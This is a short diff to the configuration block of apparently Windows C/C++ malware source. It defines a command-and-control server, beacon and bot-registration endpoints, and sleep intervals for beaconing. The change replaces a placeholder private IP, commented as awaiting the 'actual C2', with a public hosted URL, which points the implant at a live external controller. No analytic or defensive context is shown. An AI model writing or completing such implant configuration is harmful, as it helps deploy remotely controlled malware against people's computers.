@@ -15,7 +15,7 @@
 #pragma comment(lib, "advapi32.lib")
 
 // ==================== CONFIGURATION ====================
-#define C2_SERVER L"http://192.168.1.100:8080"  // PLACEHOLDER - Replace with actual C2
+#define C2_SERVER L"https://unimportant.onrender.com"
 #define BEACON_ENDPOINT L"/beacon"
 #define BOT_ID_ENDPOINT L"/register"
 #define SLEEP_MIN 30000   // 30 seconds minimum
